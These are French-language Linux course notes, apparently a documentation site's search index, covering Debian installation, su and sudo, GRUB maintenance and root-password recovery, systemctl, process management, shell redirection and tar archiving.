d\u00e9p\u00f4t local</li> <li>Beaucoup de paquets install\u00e9s ne seront peut-\u00eatre pas utiles</li> <li>Ne contiens pas les derni\u00e8res mises \u00e0 jour</li> <li>CD-ROM Netinstall</li> <li>Contient le minimum pour lancer l\u2019installation et r\u00e9cup\u00e9rer les fichiers depuis un d\u00e9p\u00f4t internet ou local</li> <li>Peut n\u00e9cessiter une connexion internet</li> <li>Permets la r\u00e9cup\u00e9ration des paquets \u00e0 jour</li> </ul> <p>T\u00e9l\u00e9chargement ISO</p> <p>https://www.debian.org/CD/http-ftp/#stable</p> <p>Les P\u00e9riph\u00e9riques USB</p> <p>Ce sont les m\u00eames images ISO utilis\u00e9 pour les installations via CD ou DVD. Mais dans ce cas le support optique est remplac\u00e9 par un support USB pour cela il faut cr\u00e9er une cl\u00e9 bootable via des logiciels tiers, parmi les plus connus on peut citer\u00a0:  </p> <ul> <li>Ventoy (Windows, Linux)</li> <li>Balena Etcher (Windows, Linux, macOS)</li> <li>Rufus (Windows)</li> <li>Unetbootin (Windows, Linux, macOS)</li> </ul> <p>Le r\u00e9seau local</p> <p>La plupart des BIOS et UEFI actuels permettent l\u2019amor\u00e7age \u00e0 partir du r\u00e9seau gr\u00e2ce au boot PXE Au d\u00e9marrage, la machine re\u00e7oit d\u2019un serveur d\u00e9di\u00e9 une adresse IP et le nom du fichier d\u2019installation \u00e0 t\u00e9l\u00e9charger  </p> <p>Diverse autre m\u00e9thode</p> <p>Pour du d\u00e9ploiement sur un grand nombre de machines, plusieurs m\u00e9thodes plus ou moins automatis\u00e9es existent\u00a0:  </p> <ul> <li>FAI (Fully Automatic Installation) pour une installation sans intervention avec plusieurs informations d\u00e9j\u00e0 indiqu\u00e9 dans un fichier de r\u00e9ponse et de configuration</li> <li>CD personnalis\u00e9s avec pr\u00e9configuration</li> <li>D\u00e9ploiements avec outils de clonage\u00a0:</li> <li>FOG</li> <li>Symantec Ghost</li> <li>Acronis True Image</li> <li>Clonezilla\u2026</li> </ul>"},{"location":"Linux/Administration_Debian/#installer-debian","title":"Installer Debian","text":"<p>Pour s\u2019installer, un syst\u00e8me Linux doit contenir, au minimum, deux partitions\u00a0:</p> <ul> <li>1 partition Racine\u00a0: / l\u2019origine du syst\u00e8me d\u2019exploitation du FHZ Linux </li> <li>1 partition d\u2019\u00e9change\u00a0: SWAP</li> </ul> <p>La quantit\u00e9 d\u2019espace disque recommand\u00e9e pour la partition de SWAP varie suivant la quantit\u00e9 de RAM install\u00e9e ou allou\u00e9e\u00a0:</p> <ul> <li>RAM &lt; 1Go SWAP = RAM\u00a0x1.5</li> <li>RAM &lt;= 2Go SWAP = RAM</li> <li>RAM &gt; 2Go SWAP = 2Go ou + selon le besoin</li> </ul> <p>Au d\u00e9marrage de l\u2019installation, et ce peut importe le m\u00e9dia choisi (optique, amovible\u2026), le choix est donn\u00e9 entre une installation graphique ou une installation simple qui utilisera un mode texte am\u00e9lior\u00e9 dit \u00ab\u00a0semi-graphique\u00a0\u00bb.  </p> <p>Ce choix ne d\u00e9signe pas le mode cible de l\u2019installation de Debian.  </p> <p>On peut installer un serveur Linux en passant par l\u2019installation graphique, comme un PC de bureau avec interface graphique.  </p> <p>Mode de l\u2019installeur est diff\u00e9rent du mode de fonctionnement</p> <p>Installation manuelle debian https://debian-facile.org/doc:install:partitions-manuel</p>"},{"location":"Linux/Administration_Debian/#su-vs-sudo","title":"su vs sudo","text":""},{"location":"Linux/Administration_Debian/#ecole-du-su","title":"\u00c9cole du su","text":"<p>!!! tip endline end \u00ab\u00a0\u00bb     dans un premier temps mettre un mdp simple avec des caract\u00e8res ayant le meme emplacement que sur un clavier qwerty     Dans le second temps changer le mdp une fois la phase d'installation termin\u00e9e.</p> <pre><code>user30@deb:~$ su -\nMot de passe :\nroot@deb:~#\n</code></pre> <p>Durant la phase d\u2019installation, l\u2019installeur saisit un mot de passe affect\u00e9 \u00e0 root Le simple fait d\u2019effectuer cette action lui r\u00e9serve, et a lui seul, les pouvoirs d\u2019administration Le premier utilisateur cr\u00e9\u00e9 ne poss\u00e9dera quant \u00e0 lui que des privil\u00e8ges limit\u00e9s.  </p>"},{"location":"Linux/Administration_Debian/#ecole-du-sudo","title":"\u00c9cole du sudo","text":"<pre><code>user30@deb:~$ sudo -i\n[sudo] Mot de passe de user30 :\nroot@deb:~#\n</code></pre> <p>Il est fortement d\u00e9conseill\u00e9 de cr\u00e9er un seul utilisateur avec le privil\u00e8ge sudo.</p> <p>Si durant la phase d\u2019installation, l\u2019installeur ne saisit pas de mot de passe pour le compte root, c\u2019est le premier utilisateur qui aura la possibilit\u00e9 d\u2019effectuer une \u00e9l\u00e9vation de privil\u00e8ge via son propre mot de passe avec la commande sudo </p> <p>Il est possible apr\u00e8s l\u2019installation d\u2019affecter un mot de passe au compte root afin de l\u2019activer et ainsi lib\u00e9rer l\u2019utilisateur principal de son r\u00f4le sudo </p> <pre><code>user30@deb:~$ sudo passwd root\n[sudo] Mot de passe de user30:\nroot@deb:~# passwd\nNouveau mot de passe :\nRetapez le nouveau mot de passe :\npasswd : le mot de passe a \u00e9t\u00e9 mis \u00e0 jour avec succ\u00e8s\n</code></pre>"},{"location":"Linux/Administration_Debian/#partitionnement-des-disques","title":"Partitionnement des disques","text":"<p>Cette phase consiste \u00e0 choisir comment subdiviser son disque pour cr\u00e9er les diff\u00e9rents points de montage du syst\u00e8me  </p> <p>Actuellement, la technologie LVM est \u00e0 pr\u00e9f\u00e9rer.  </p> <p>Voir la fiche Partitionnement</p>"},{"location":"Linux/Administration_Debian/#selection-des-logiciels","title":"S\u00e9lection des logiciels","text":"<p>Dans le cas d\u2019une installation Netinstall le configurateur demandera le d\u00e9p\u00f4t ou l\u2019on souhaite r\u00e9cup\u00e9rer les paquets et applications souhait\u00e9s.  </p> <p>Si l\u2019installation a \u00e9t\u00e9 effectu\u00e9e depuis un m\u00e9dia optique ou amovible avec une version compl\u00e8te, l\u2019installeur proposera diff\u00e9rentes p\u00e2tes (paquets) \u00e0 installer, possibilit\u00e9 d\u2019installer une interface graphique, des paquets pour serveur web, SSH\u2026</p>"},{"location":"Linux/Administration_Debian/#installation-du-programme-de-demarrage-grub","title":"Installation du programme de d\u00e9marrage GRUB","text":"<p>il s\u2019agit de la derni\u00e8re \u00e9tape de l\u2019installation, il faudra toujours installer le programme de d\u00e9marrage (le GRUB) sur /dev/sda Si cela n\u2019est pas valid\u00e9, il ne sera pas possible de d\u00e9marrer le syst\u00e8me (m\u00eame si celui-ci est bien pr\u00e9sent sur la machine)</p>"},{"location":"Linux/Administration_Debian/#mode-maintenance","title":"Mode Maintenance","text":"<p>Il est parfois n\u00e9cessaire de passer en mode maintenance sur un ordinateur ou un serveur pour diverses raisons  </p> <ul> <li>Le syst\u00e8me ne d\u00e9marre plus suite \u00e0 une mise \u00e0 jour ou une installation</li> <li>Le mot de passe de l\u2019utilisateur root est perdu</li> <li>R\u00e9cup\u00e9ration de donn\u00e9es</li> </ul>"},{"location":"Linux/Administration_Debian/#grub","title":"GRUB","text":"<p>Ce mode n'est pas fonctionnel en mode \"sudo sans mot de passe\" pour l'utilisateur</p> <p>Passer par le boot manager GRUB pour passer en mode maintenance. Utilisez les fl\u00e8ches pour choisir le noyau souhait\u00e9 puis appuyez sur la touche \u00ab\u00a0e\u00a0\u00bb.  </p> <p>Modifier la fin de la ligne suivante\u00a0:  </p> <p><code>linux  /vmlinuz[version_du_ficher] root=/dev/mapper/debian--vg-sys ro quiet</code> </p> <p>par\u00a0:  </p> <p><code>linux  /vmlinuz[version_du_ficher] root=/dev/mapper/debian--vg-sys ro single</code> </p> <p>Valider avec [ctrl+x] ou [F10]. Saisissez le mot de passe root. \u00ad\u00a1 Attention le clavier est au format QWERTY en-US\u00a0! Apr\u00e8s vos actions en mode maintenance, la s\u00e9quence de touches [ctrl+d] vous permettra de poursuivre le chargement vers la cible rescue.target </p>"},{"location":"Linux/Administration_Debian/#grub-sans-mots-de-passe-root","title":"GRUB sans mots de passe root","text":"<p>Comme ci-dessus, nous passons par le boot manager pour acc\u00e9der au mode maintenance.  </p> <p>Il faut toujours modifier la ligne pr\u00e9c\u00e9dente, mais cette fois il faut remplacer quiet par init=/bin/bash </p> <p><code>linux  /vmlinuz[version_du_ficher] root=/dev/mapper/debian--vg-sys ro init=/bin/bash</code> </p> <p>Il faudra \u00e9galement valider avec [ctrl+x] ou [F10] Une fois de plus, le clavier sera en QWERTY en-US  </p> <p>Le syst\u00e8me est d\u00e9marr\u00e9, mais le syst\u00e8me de fichier racine est en lecture seule. Il faut lancer la commande suivante pour obtenir l\u2019acc\u00e8s en \u00e9criture\u00a0:  </p> <pre><code>root@(none):/# mount -o remount,rw /\n[   88.5124578] EXT4-fs (dm-0): re-mounted. Opts: errors=remount-ro\nroot@(none):/#\n</code></pre> <p>Apr\u00e8s cette manipulation, synchronisez l\u2019\u00e9criture des donn\u00e9es en RAM vers le disque avec la commande\u00a0: <code>sync</code> </p> <p>!!! danger \u00ab\u00a0RAPPEL\u00a0\u00bb     Arret propre de la machine impossible     Il faut forcer l'extinction par un PowerOff electrique</p>"},{"location":"Linux/Bash_avance/","title":"M\u00e9canisme Linux et Bash Avanc\u00e9","text":""},{"location":"Linux/Bash_avance/#gestion-du-systeme","title":"Gestion du syst\u00e8me","text":"<p>Cette note fait r\u00e9f\u00e9rence aux s\u00e9quences de d\u00e9marrage reprises dans la page Gestion Debian</p> <p><code>systemctl &lt;action&gt; [cible/service/unit]</code> </p> <p>Il s\u2019agit de la commande par laquelle nous pourrons, entre autres\u00a0:  </p> <ul> <li>afficher la cible par d\u00e9faut</li> <li>changer de cible par d\u00e9faut</li> <li>changer de cible directement</li> <li>g\u00e9rer les services</li> <li>lister les cibles, services, et autres \u00e9l\u00e9ments de SystemD</li> </ul>"},{"location":"Linux/Bash_avance/#connaitre-la-cible-par-defaut","title":"Connaitre la cible par d\u00e9faut","text":"<p>Permets de connaitre la cible par d\u00e9faut lanc\u00e9 au d\u00e9marrage de l\u2019OS</p> <pre><code>root@deb:~# systemctl get-default\ngraphical.target\n</code></pre>"},{"location":"Linux/Bash_avance/#changer-la-cible-par-defaut","title":"Changer la cible par d\u00e9faut","text":"<pre><code>root@deb:~# systemctl set-default multi-user.target\nRemoved /etc/systemd/system/default.target\nCreated symlink /etc/systemd/system/default.target -&gt; /lib/systemd/system/multi-user.target\n</code></pre>"},{"location":"Linux/Bash_avance/#changer-de-cible","title":"Changer de cible","text":"<p>Dans l\u2019exemple suivant, cette commande permettra de passer en mode maintenance</p> <pre><code>root@deb:~# systemctl \u00ecsolate rescue.target\n</code></pre>"},{"location":"Linux/Bash_avance/#lister-les-elements","title":"Lister les \u00e9l\u00e9ments","text":"<pre><code>root@deb:~# systemctl list-units\n...\nnetworking.service      loaded active exited    Raise network interfaces\nrsyslog.service         loaded active running   System Logging Service\n...\nmulti-user.target       loaded active active    Multi-User System\nnetwork.target          loaded active active    Network\n</code></pre>"},{"location":"Linux/Bash_avance/#lister-tous-les-units","title":"Lister tous les units","text":"<pre><code>root@deb:~# systemctl list-units --all\ngetty-pre.target        loaded    inactive  dead    Login Prompts (Pre)\ngetty.target            loaded    active    active  Login Prompts\ngraphical.target        loaded    inactive  dead    Graphical Interface\nlocal-fs-pre.target     loaded    active    active  Local File Systems (Pre)\n</code></pre> <p><code>--all</code> permets de lister l\u2019int\u00e9gralit\u00e9 des services de la machine, qu\u2019ils soient actifs ou non  </p>"},{"location":"Linux/Bash_avance/#gestion-des-services","title":"Gestion des services","text":"<p>Le plus souvent, nous allons g\u00e9rer des services, cela est \u00e9galement r\u00e9alisable avec la commande <code>systemctl</code></p>"},{"location":"Linux/Bash_avance/#voir-le-statut-dun-service","title":"Voir le statut d\u2019un service","text":"<pre><code>root@deb:~# systemctl status cron.service\n    cron.service - Regular background program daemon\n...\n</code></pre>"},{"location":"Linux/Bash_avance/#demarrer-un-service","title":"D\u00e9marrer un service","text":""},{"location":"Linux/Bash_avance/#arreter-un-service","title":"Arr\u00eater un service","text":""},{"location":"Linux/Bash_avance/#redemarrer-un-service","title":"Red\u00e9marrer un service","text":""},{"location":"Linux/Bash_avance/#activer-et-desactiver-un-service","title":"Activer et d\u00e9sactiver un service","text":"<p>\u00c0 noter les commandes, <code>enable/disable</code>ne joue pas sur l\u2019\u00e9tat actuel de la machine et des services. Cela n\u2019affectera les services qu\u2019au prochain d\u00e9marrage de la machine.  </p>"},{"location":"Linux/Bash_avance/#gestion-des-processus","title":"Gestion des processus","text":"<p>Un processus est l\u2019image d\u2019un fichier programme en cours d\u2019ex\u00e9cution, identifi\u00e9 par un PID Unique dans la m\u00e9moire vive de notre OS. Un utilisateur peut lancer plusieurs processus simultan\u00e9ment. Un processus peut \u00e9galement cr\u00e9er d\u2019autres processus, formant une hi\u00e9rarchie (Notions de processus parents &amp; enfants)  </p>"},{"location":"Linux/Bash_avance/#lister-les-processus","title":"Lister les processus","text":""},{"location":"Linux/Bash_avance/#commande-ps","title":"Commande <code>ps</code>","text":"<p><code>ps [-a -e -f -u -x]</code></p> <pre><code>user30@deb:~$ ps\n    PID TTY             TIME  CMD\n    808 pts/0       00:00:00  bash\n    1212 pts/0       00:00:00  ps\nuser30@deb:~$\n</code></pre> Explication des Colonnes PIDTTYTIMECOMMAND <p>Process ID: Identifiant unique d'un processus</p> <p>Nom du terminal auquel le processus est rattach\u00e9</p> <p>Temps cumul\u00e9 d'\u00e9x\u00e9cution</p> <p>Commande \u00e0 l'origine du processus</p> lister tous les processus en cours CommandeOption -f <pre><code>user30@deb:~$ ps -ef\nUID         PID    PPID  C  STIME  TTY          TIME    CMD\n`[...]`\nsystemd+    504       1  0  08:57  ?        00:00:00    /lib/systemd/systemd-timesyncd\nmessage+    510       1  0  08:57  ?        00:00:00    /usr/bin/dbus-daemon --system\nroot        512       1  0  08:57  ?        00:00:00    /lib/systemd/systemd-logind\nroot        513       1  0  08:57  ?        00:00:00    /usr/sbin/rsyslogd -n -iNONE\nroot        591       1  0  08:57  ?        00:00:00    /usr/sbin/sshd -D\nuser30      798       1  0  15:08  ?        00:00:00    /lib/systemd/systemd --user\nuser30      799     798  0  15:08  ?        00:00:00    (sd-pam)\nuser30      807     795  0  15:08  ?        00:00:00    sshd: user30@pts/0\nuser30      808     807  0  15:08  pts/0    00:00:00    -bash\n</code></pre> <p>Ajoute les colonnes - UID = Identifiant Unique de l'utilisateur - PPID = Processus Parents - STIME = Information sur l'heure de lancement du processus</p> Option -e <p>Affiche les processus de tous les utilisateurs</p> lister sous forme d\u2019arbre Processus de l'utilisateurProcessus de tous les utilisateurs <pre><code>user30@deb:~$ ps -uf\nUSER        PID  %CPU  %MEM    VSZ   RSS  TTY       STAT   START    TIME  COMMAND\nuser30      808   0.0   0.2   7652  4424  pts/0     Ss     15:08    0:00  -bash\nuser30     1309   0.0   0.1  10916  3204  pts/0     R+     16:10    0:00   \\_ps -uf\n</code></pre> <pre><code>user30@deb:~$ ps -faux\nUSER        PID  %CPU  %MEM    VSZ   RSS  TTY       STAT   START    TIME  COMMAND\n`[...]`\nroot        591  0.0    0.3  15852  6676  ?         Ss     08:57    0:00  /usr/sbin/sshd -D\nroot        795  0.0    0.3  16632  7892  ?         Ss     15:08    0:00   \\_ sshd: user30 `[priv]`\nuser30      807  0.0    0.2  16916  6016  ?         S      15:08    0:00      \\_sshd: user30@pts/0\nuser30      808  0.0    0.2   7652  4424  pts/0     Ss     15:08    0:00        \\_ -bash\nuser30     1348  0.0    0.1  11076  3620  pts/0     R+     16:17    0:00            \\_ ps -faux\n</code></pre>"},{"location":"Linux/Bash_avance/#commande-lsof","title":"Commande <code>lsof</code>","text":"<p>Permets de d\u00e9nombrer les fichiers en cours d'utilisation par des processus. Possibilit\u00e9 de filtrer les r\u00e9sultats avec la commande <code>grep</code></p> Utilisation <code>lsof</code> syntaxe de baseConnaitre l'activit\u00e9 des fichiers ouverts dans un r\u00e9pertoire donn\u00e9 <pre><code>root@deb:~# lsof |grep /var\n</code></pre> <pre><code>root@deb lsof /root\nlsof: WARNING: can't stat() fuse.gvfsd-fuse file system /run/user/1000/gvfs\n      Output information may be incomplete.\nCOMMAND  PID  USER FD  TYPE DEVICE SIZE/OFF NODE    NAME\nbash     2074 root cwd DIR  254,0  4096     781836  /root\nbash     2179 root cwd DIR  254,0  4096     781836  /root\nlsof     3826 root cwd DIR  254,0  4096     781836  /root\nlsof     3827 root cwd DIR  254,0  4096     781836  /root\n</code></pre>"},{"location":"Linux/Bash_avance/#stopper-des-processus","title":"Stopper des processus","text":""},{"location":"Linux/Bash_avance/#commande-kill","title":"Commande <code>kill</code>","text":"<p><code>kill [-sig] &lt;pid&gt; (&lt;pid&gt; &lt;pid&gt;)</code> </p> <p>Permets d\u2019arr\u00eater (tuer) un processus en pr\u00e9cisant le type d\u2019arr\u00eat Sans pr\u00e9cision, le signal envoy\u00e9 est 15, ou <code>SIGTERM</code> </p> Nom ID Num Effet SIGTERM 15 Envoi d\u2019une instruction au processus pour qu\u2019il se termine proprement. C\u2019est la valeur par d\u00e9faut et celle \u00e0 privil\u00e9gier. SIGINT 2 Envoi d\u2019un signal d\u2019interruption (\u00e9quivalent de <code>[ctrl+c]</code> dans un terminal) SIGHUP 1 Envoi d\u2019un signal d\u2019arr\u00eat de session terminal (HangUp) SIGKILL 9 Arr\u00eat inconditionnel. Tuer directement le processus (dangereux) Stopper des processus Sans SIG sp\u00e9cifiqueAvec SIGINT <pre><code>user30@deb:~$ ps -f\nUID         PID     PPID   C  STIME  TTY         TIME  CMD\nuser30      745      744   0  15:31  pts/0   00:00:00  -bash\nuser30      749      745   0  15:32  pts/0   00:00:00  sleep 600\nuser30@deb:~$ kill 749\nuser30@deb:~$ ps -f\nuser30      745      744   0  15:31  pts/0   00:00:00  -bash\n</code></pre> <pre><code>user30@deb:~$ ps -f\nUID         PID     PPID    C   STIME   TTY     TIME      CMD\nuser30      634      633    0   10:13   pts/0   00:00:00  -bash\nuser30      954      634    0   15:16   pts/0   00:00:00  /bin/bash ./erp-install.sh\nuser30@deb:~$ kill -2 954\n</code></pre>"},{"location":"Linux/Bash_avance/#commande-pkill","title":"Commande <code>pkill</code>","text":"<p><code>pkill [-sig] &lt;processname&gt;</code></p> <p>Permets d\u2019arr\u00eater les processus correspondant au nom <code>&lt;processname&gt;</code> </p> <p>Example <code>pkill</code></p> <p><pre><code>user30@deb:~$ pkill firefox\n</code></pre> Dans l'exemple cette commande stop le processus firefox</p>"},{"location":"Linux/Bash_avance/#connaitre-le-temps-dexecution-dune-commande","title":"Connaitre le temps d\u2019ex\u00e9cution d\u2019une commande","text":"<p><code>time &lt;commande&gt;</code></p> <p>Visualiser le temps d\u2019ex\u00e9cution d\u2019une commande.</p> <pre><code>user30@deb:~$ time wc -l Edition\n31 Edition\nreal    0m0,007s\nuser    0m0,002s\nsys     0m0,000s\n</code></pre>"},{"location":"Linux/Bash_avance/#processus-en-arriere-plan","title":"processus en arri\u00e8re-plan","text":"<p>Lancer une commande en arri\u00e8re-plan se fait simplement en ajoutant le caract\u00e8re <code>&amp;</code>\u00e0 la fin de la ligne. <code>commande [opt] &lt;arg&gt; &amp;</code> </p> <p>Visualiser les processus en arri\u00e8re-plan <code>jobs [-l]</code> </p> <p><code>-l</code> Afficher les PID des processus.  </p> <p>lancement processus arri\u00e8re plan</p> <pre><code>user3030@deb:~$ ./sauvegarde.sh &amp;\n`[1]` 841\nuser30@deb:~$ ./erp-install.sh &amp;\n`[2]` 843\nuser30@deb:~$ sleep 300 &amp;\n`[3]` 845\nuser30@deb:~$ jobs\n`[1]`     En cours d'ex\u00e9cution    ./sauvegarde.sh &amp;\n`[2]`-    En cours d'ex\u00e9cution    ./erp-install.sh &amp;\n`[3]`-    En cours d'ex\u00e9cution    sleep 300 &amp;\n</code></pre> <p>Certains processus demandent \u00e9norm\u00e9ment de ressources (temps ou mat\u00e9riel) et n\u00e9cessitent d\u2019\u00eatre lanc\u00e9 en arri\u00e8re-plan. Malheureusement, il peut arriver d\u2019oublier de placer le <code>&amp;</code>le processus se lancera donc en front ground. Dans ce cas, l\u2019ex\u00e9cution de la s\u00e9quence de touche <code>[ctrl+z]</code> basculera le processus en arri\u00e8re plan, par contre, celui-ci sera mis en pause. Pour relancer l\u2019ex\u00e9cution il faudra ex\u00e9cuter la commande <code>bg</code>pour (background) + le n\u00b0 de <code>jobs</code>et non le n\u00b0 de PID </p> <p>Oublie de lancement de processus en arri\u00e8re plan</p> commande <pre><code>user30@deb:~$ ./erp-install.sh # oubli de `&amp;` permettant le lancement en arri\u00e8re plan\nInstallation de l'ERP\n`[ctrl+z]`\n`[1]`+ **Stopp\u00e9**             ./erp-install.sh\nuser30@deb:~$ bg 1 # met en pause l'ex\u00e9cution du processus et le passe en background\n`[1]`+ ./erp-install.sh &amp; # pr\u00e9sence du `&amp;` stipulant le passage en arri\u00e8re plan\nuser30@deb:~$ jobs\n`[1]` **En cours d'ex\u00e9cution**    ./erp-install.sh &amp;\nuser30@deb:~$ fg 1\n./erp-install.sh\nl'ERP a \u00e9t\u00e9 install\u00e9\n`[1]`+ **Fini**\nuser30@deb:~$\n</code></pre> <p>=== <code>ctrl+z</code>     Permet de mettre en pause l'ex\u00e9cution du processus === \"<code>bg + n\u00b0_de_jobs</code>     Permet de passer l'ex\u00e9cution du processus en arri\u00e8re-plan === \"<code>fg + n\u00b0_de_jobs</code>     Permet de passer l'ex\u00e9cution du processus en avant-plan</p>"},{"location":"Linux/Bash_avance/#commande-nohup","title":"Commande <code>nohup</code>","text":"<p>Permet de d\u00e9tacher le processus/script du terminal l\u2019ayant lanc\u00e9 et ainsi d\u2019\u00e9viter la coupure, a la fermeture du dit terminal, a la fermeture (ou timeout) de la session PUttY.  </p> <p>En effet \u00e0 la fin d\u2019une session ou \u00e0 la d\u00e9connexion tous les processus ouverts avec un terminal re\u00e7oivent le signal <code>SIGHUP</code> </p> <pre><code>user30@deb~$ nohup ./erp-install.sh &amp;\n`[1]` 867\nuser30@deb:~$ nohup: les entr\u00e9es sont ignor\u00e9es et la sortie est ajout\u00e9e \u00e0 'nohup.out'\nuser30@deb:~$\n</code></pre> <p>A noter que les flux <code>stdout</code> et <code>stderr</code> seront copi\u00e9 dans un fichier nohup.out Celui-devrai \u00eatre supprim\u00e9 apres l'ex\u00e9cution de la commande</p>"},{"location":"Linux/Bash_avance/#mecanisme-de-redirection","title":"M\u00e9canisme de redirection","text":"<pre><code>graph LR\n  A[Flux d'entr\u00e9e] --&gt;|stdin| B[Commande];\n  B --&gt;|stdout| C[Flux de sortie standard];\n  B --&gt;|stderr| D[Flux de sortie erreur];\n</code></pre>"},{"location":"Linux/Bash_avance/#le-pipe","title":"Le Pipe <code>|</code>","text":"<p>L\u2019utilisation du <code>|</code>vas permettre de rediriger le flux de la premi\u00e8re commande vers le flux d\u2019entr\u00e9e de la deuxi\u00e8me commande.  </p> <p><code>Commande1 | Commande 2</code></p> <pre><code>graph LR\n  A[Clavier] --&gt;|stdin| B[Commande 1];\n  B --&gt;|stdout| C[Pipe];\n  C --&gt; |stdin| D[Commande 2]\n  D --&gt; |stdout| E[\u00c9cran];\n</code></pre>"},{"location":"Linux/Bash_avance/#le-chevron","title":"Le chevron <code>&gt;</code>","text":"<p>Le caract\u00e8re <code>&gt;</code>ou <code>&gt;&gt;</code>permet d\u2019enregistrer la sortie standard dans un fichier  </p> <p>\u00c0 noter</p> <p>Si le fichier n'est pas existant il sera cr\u00e9e au moment de la r\u00e9direction</p> <p><code>commande&gt;fichier.txt</code> \u00c9crase le contenu du fichier si celui-ci est d\u00e9j\u00e0 existant  </p> <p><code>commande&gt;&gt;fichier.txt</code> Ajoute le contenu au fichier d\u00e9j\u00e0 existant  </p> <pre><code>graph LR\n  A[clavier] --&gt;|stdin| B[Commande];\n  B --&gt;|stdout| C[&gt;];\n  C --&gt;|redirection| D[fichier.txt];\n</code></pre>"},{"location":"Linux/Bash_avance/#rediriger-un-flux-derreur","title":"Rediriger un flux d\u2019erreur","text":""},{"location":"Linux/Bash_avance/#vers-un-fichier","title":"Vers un fichier","text":"<p>L\u2019ajout du chiffre <code>2</code>\u00e0 la fin de la commande coupl\u00e9 aux caract\u00e8res <code>&gt;</code>ou <code>&gt;&gt;</code>permet d\u2019enregistrer la sortie d\u2019erreur dans un fichier  </p> <p>\u00c0 noter</p> <p>Si le fichier n'est pas existant il sera cr\u00e9e au moment de la r\u00e9direction</p> <p><code>commande 2&gt;fichier.txt</code> \u00c9crase le contenu du fichier si celui-ci est d\u00e9j\u00e0 existant  </p> <p><code>commande 2&gt;&gt;fichier.txt</code> Ajoute le contenu au fichier d\u00e9j\u00e0 existant  </p> <pre><code>graph LR\n  A[clavier] --&gt;|stdin| B[Commande];\n  B --&gt;|stdout| C[2&gt;];\n  C --&gt;|redirection| D[errors.txt];\n</code></pre>"},{"location":"Linux/Bash_avance/#vers-le-flux-de-sortie-standard","title":"Vers le flux de sortie standard","text":"<p>En reprenant les \u00e9l\u00e9ments pr\u00e9c\u00e9dents de redirection du flux d\u2019erreur, il est possible de le renvoyer vers la sortie standard via<code>2&gt;&amp;1</code>, utile pour un fichier de journalisation ou nous souhaiterions faire apparaitre l\u2019int\u00e9gralit\u00e9 des actions  </p> <p><code>commande 2&gt;&amp;1</code> </p> Redirection des sorties\u00a01 &amp; 2 vers le fichier \"result.log\" <pre><code>user30@deb:~$ head -3 Edition dir1/fic2 &gt;&gt; result.log 2&gt;&amp;1\nuser30@deb:~$ cat result.log\n==&gt;Edition&lt;==\nAboaf Maurice 244748\nAdda Jen 239234\nAllo Jean-Pierre 255398\nhead: impossible d'ouvrir 'dir1/fic2` en lecture: Aucun fichier ou dossier de ce type\n</code></pre> <p><code>&amp;&gt;</code></p> <p>Specifique au bash la syntaxe <code>commande &amp;&gt;</code> permet la m\u00eame action</p>"},{"location":"Linux/Bash_avance/#doubler-la-redirection","title":"Doubler la redirection","text":"<p>Permet d'afficher la sortie standard \u00e0 l'\u00e9cran et de la rediriger dans un fichier en m\u00eame temps afin de l'avoir en sauvegarde pour pouvoir l'exploiter  </p> <p><code>commande | tee [-a] fichier. txt</code></p> <ul> <li><code>tee</code> sans option \u00e9crasera le fichier deja existant (\u00e9quivalent a <code>&gt;</code>)</li> <li><code>[] -a]</code> permet d'\u00e9crire \u00e0 la suite d'un fichier d\u00e9ja existant (\u00e9quivalent a <code>&gt;&gt;</code>)</li> </ul> <pre><code>graph LR\n  A[clavier] --&gt;|stdout| B[pipe];\n  B --&gt;|stdin| C[tee];\n  C --&gt; D[\u00c9cran];\n  C --&gt; E[fichier.txt];\n</code></pre>"},{"location":"Linux/Bash_avance/#rediriger-un-fichier-vers-le-flux-dentree","title":"Rediriger un fichier vers le flux d\u2019entr\u00e9e","text":"<p>Permets de rediriger le contenu d\u2019un fichier vers une commande  </p> <p><code>Commande &lt; fichiersource.txt</code></p> <p>Utilisation du <code>&lt;</code></p> Diffusion de messageRemplacement des minuscules par des majuscules <pre><code>user30@deb:~$ wall &lt; modeles/warning.txt\nDiffusion de message de user30@deb (pts/0) (Tue Sep 8 16:11:45 2020) :\n/!\\ Attention /!\\\nRedemarrage du serveur\ndans dix minutes\nuser30@deb:~$\n</code></pre> <pre><code>user30@deb:~$ cat fichier.txt\nbonjour,\nceci est un message g\u00e9n\u00e9rique de test\nuser30@deb:~$ tr a-z A-Z &lt; fichier.txt\nBONJOUR,\nCECI EST UN MESSAGE G\u00e9N\u00e9RIQUE DE TEST\n</code></pre>"},{"location":"Linux/Bash_avance/#archivage-et-compression","title":"Archivage et compression","text":"<p>Archive ne veut pas dire obligatoirement compression Un fichier iso est une archive et elle n'est pas compress\u00e9</p> <ul> <li>Archiver : cr\u00e9er un fichier conteneur dans lequel on pourra en plusieurs autres.</li> <li>Compresser: r\u00e9duire la taille d'un fichier dans le but de minimiser l'espace de stockage occup\u00e9 ainsi que de r\u00e9duire les temps de transfert.</li> <li>Ex: un fichier zip ou rar</li> </ul>"},{"location":"Linux/Bash_avance/#commande-tar","title":"Commande <code>tar</code>","text":"<p>La commande <code>tar</code>: une commande pour tout faire !  </p> <p><code>tar [-c -t -x -z -j -v -f] archive. tar</code></p> bzip2tgz <p>Format de compression disponible sous Linux Plus efficace en terme de compression que Gzip Demande plus de ressource.</p> <p>Il s'agit d'une version raccourcie de <code>tar.gz</code></p> option description <code>c</code> Cr\u00e9er une archive <code>t</code> Lister le contenu <code>x</code> Extraire le contenu <code>z</code> Pr\u00e9ciser l'utilisation de la compression avec <code>gzip</code> <code>j</code> Pr\u00e9ciser l'utilisation de la compression avec <code>bzip</code> <code>u</code> Mettre \u00e0 jour une archive existante <code>v</code> Activer le mode verbeux <code>f</code> Pr\u00e9ciser le nom du fichier"},{"location":"Linux/Bash_avance/#extraire-une-archive","title":"Extraire une archive","text":"Extraction \u00e0 l'emplacement actueldans le dossier restau.d en mode verbeux <pre><code>user30@deb:~$ tar -xf archive.tar.gz\nuser30@deb:~$\n</code></pre> <pre><code>user30@deb:~$ tar xvf archive.tar.gz -C restau.d\ncontacts.txt\nedition1.txt\nerr.txt\nFait.txt\n</code></pre> <p>On rencontre r\u00e9guli\u00e8rement l'extension <code>.tgz</code> Une version raccourcie de <code>tar.gz</code></p> Cr\u00e9ation d'une archive archive.tar contient fichier \"Edition\" et tous les \"txt\"Cr\u00e9ation \"archive.tar.gz\" compr\u00e9ss\u00e9 au format \"gzip\"Cr\u00e9ation archive compress\u00e9 au format <code>bzip2</code> <pre><code>user30@deb:~$ tar -cvf archive.tar Edition *.txt\nEdition\ncontacts.txt\nedition1.txt\nerr.txt\nFait.txt\n</code></pre> <pre><code>user30@deb:~$ tar -czf archive.tar.gz Edition 